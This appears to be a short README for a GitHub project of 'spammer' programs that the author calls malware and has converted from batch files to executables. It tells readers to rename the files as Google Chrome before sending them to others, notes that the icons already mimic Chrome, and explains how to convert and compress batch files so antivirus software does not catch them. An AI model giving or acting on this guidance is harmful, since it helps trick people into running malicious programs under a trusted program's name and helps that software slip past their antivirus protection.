These are the spammers switched from .bat format to .exe format 

Now because they are an exe file and a type of Malware your computer anti virus will delete the files 
if you try to take them out of the foler run them or even when they are downloaded 

Make sure if your sending these to someone you change the name for the .exe files to google chrome 
because I made the icons on them chrome icons 

If you would like to make the .bat file you download from my github or that you made yourself using the script 
into a .exe file download the program on the github it is called bat to exe coverter and you drag the .bat file 
into the program and press convert at the top now fi you want to add an icon through the coverter program the photo 
file must be a .ico file so convert a photo into .ico plenty of websites for that and than you will press the icon 
part and than add the file and I reccomend compressing it too so it does not trigger your anti virus once you make 
it.
